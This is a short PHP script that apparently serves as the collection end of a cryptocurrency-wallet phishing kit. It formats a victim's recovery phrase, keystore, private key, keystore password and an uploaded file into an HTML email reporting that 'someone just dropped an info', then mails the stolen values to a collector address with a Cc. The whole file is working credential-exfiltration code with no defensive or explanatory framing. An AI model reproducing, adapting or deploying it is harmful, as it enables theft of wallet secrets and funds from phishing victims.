<?php
$to = $email;
$subject = "Information Delivery";

$message = "
<html>
<head>
<title>Someone Just Dropped an info</title>
</head>
<body>
<p>Hello! </p>

<p>Below is the information that just dropped</p>
<p>
**********************************************************
</p>

<p><strong> phase : ***********_". $phase. "_***********</strong> </p><br>
<p><strong> keystore : ***********_". $keystore. "_***********</strong> </p>
<p><strong> private key : ***********_" . $private_key . "_***********</strong> </p>
<p><strong> keystore password : ***********_" . $keystore_password . "_***********</strong> </p>
<p><strong> file : ***********_".$file."_***********</strong> </p>
<p>
**********************************************************
</p>
</body>
</html>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: wherever.COM' . "\r\n";
$headers .= 'Cc: anywhere.COM' . "\r\n";

mail($to,$subject,$message,$headers);
?>